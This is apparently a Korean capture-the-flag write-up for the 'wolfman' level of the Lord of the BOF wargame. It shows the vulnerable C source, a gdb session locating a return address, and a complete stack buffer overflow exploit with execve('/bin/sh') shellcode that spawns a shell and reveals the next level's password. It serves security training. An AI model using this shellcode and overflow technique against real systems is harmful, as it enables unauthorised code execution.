@@ -1,0 +1,117 @@
+I"� <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login: orc
+Password:
+<span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">ls
+</span>wolfman  wolfman.c
+<span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">cat </span>wolfman.c
+/<span class="k">*</span>
+        The Lord of the BOF : The Fellowship of the BOF
+        - wolfman
+        - egghunter + buffer hunter
+<span class="k">*</span>/
+
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;stdlib.h&gt;</span>
+
+extern char <span class="k">**</span>environ<span class="p">;</span>
+
+main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">)</span>
+<span class="o">{</span>
+        char buffer[40]<span class="p">;</span>
+        int i<span class="p">;</span>
+
+        <span class="k">if</span><span class="o">(</span>argc &lt; 2<span class="o">){</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"argv error</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+
+        // egghunter
+        <span class="k">for</span><span class="o">(</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span> environ[i]<span class="p">;</span> i++<span class="o">)</span>
+                memset<span class="o">(</span>environ[i], 0, strlen<span class="o">(</span>environ[i]<span class="o">))</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="o">(</span>argv[1][47] <span class="o">!=</span> <span class="s1">'\xbf'</span><span class="o">)</span>
+        <span class="o">{</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"stack is still your friend.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+        strcpy<span class="o">(</span>buffer, argv[1]<span class="o">)</span><span class="p">;</span>
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, buffer<span class="o">)</span><span class="p">;</span>
+
+        // buffer hunter
+        memset<span class="o">(</span>buffer, 0, 40<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>전의 orc 문제와 거의 비슷하다.</p>
+
+<p>다른 점이 있다면 가장 밑에 memset이라는 함수를 사용했다는 것이다.</p>
+
+<p>memset(배열 이름, 채울 값, 끝 인덱스) 형식으로 사용되는 함수이다.</p>
+
+<p>시작부터 끝까지 모두 채울 값으로 배열을 초기화한다.</p>
+
+<p>이것은 배열 안에 쉘 코드를 넣을 수 없다는 것을 의미한다.</p>
+
+<p>그래서 이번에 사용할 방법은, RET주소 뒤에 쉘 코드를 넣는 것이다.</p>
+
+<p>nop+RET+nop+쉘 코드의 형식으로 넣으면 배열이 초기화가 된다고 해도 쉘 코드는 남는 것이다.</p>
+
+<p>그러면 주소를 구해보자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">mkdir </span>tmp
+<span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">cp </span>wolfman tmp/
+<span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">cd </span>tmp
+</code></pre></div></div>
+<p>gdb를 사용하자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>orc@localhost tmp]<span class="nv">$ </span>gdb <span class="nt">-q</span> wolfman
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
+<span class="o">(</span>gdb<span class="o">)</span> disas main
+Dump of assembler code <span class="k">for function </span>main:
+0x8048500 &lt;main&gt;:       push   %ebp
+0x8048501 &lt;main+1&gt;:     mov    %ebp,%esp
+0x8048503 &lt;main+3&gt;:     sub    %esp,44
+...
+0x80485b8 &lt;main+184&gt;:   push   %edx
+0x80485b9 &lt;main+185&gt;:   lea    %eax,[%ebp-40]
+0x80485bc &lt;main+188&gt;:   push   %eax
+0x80485bd &lt;main+189&gt;:   call   0x8048440 &lt;strcpy&gt;
+0x80485c2 &lt;main+194&gt;:   add    %esp,8
+
+</code></pre></div></div>
+<p>ma+189에서 strcpy가 되므로 그 아래, main+194에 break를 걸자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b<span class="k">*</span>main+194
+Breakpoint 1 at 0x80485c2
+<span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\xbf"*48+"A"*100'</span><span class="si">)</span>
+Starting program: /home/orc/tmp/wolfman <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\xbf"*48+"A"*100'</span><span class="si">)</span>
+
+Breakpoint 1, 0x80485c2 <span class="k">in </span>main <span class="o">()</span>
+</code></pre></div></div>
+<p>뒤의 A는 넣을 쉘 코드라고 생각하자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/300x <span class="nv">$esp</span>
+0xbffffa54:     0xbffffa60      0xbffffbe1      0x00000016      0xbfbfbfbf
+0xbffffa64:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffa74:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffa84:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x41414141
+...
+0xbffffbe4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffbf4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffc04:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x414141bf
+0xbffffc14:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc24:     0x41414141      0x41414141      0x41414141      0x41414141
+</code></pre></div></div>
+<p>bffffc04에서 A가 보이므로 이곳을 RET 주소로 쓰자.</p>
+
+<p>코드는 nop+44+RET+nop*100(의미는 없고 그냥 적당히)+쉘 코드로 하자.</p>
+
+<p>사용할 24byte 쉘 코드</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\x</span>90<span class="s2">"*100+"</span><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>99<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>orc@localhost orc]<span class="nv">$ </span>./wolfman <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*44+"\x04\xfc\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'</span><span class="si">)</span>
+릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?퓧릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?픐h//shh/bin됥PS됣솻
+        ?
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 505
+love eyuna
+</code></pre></div></div>
+<p>성공이다.</p>
+
+<p>orc’s password : “love eyuna”</p>
+:ET
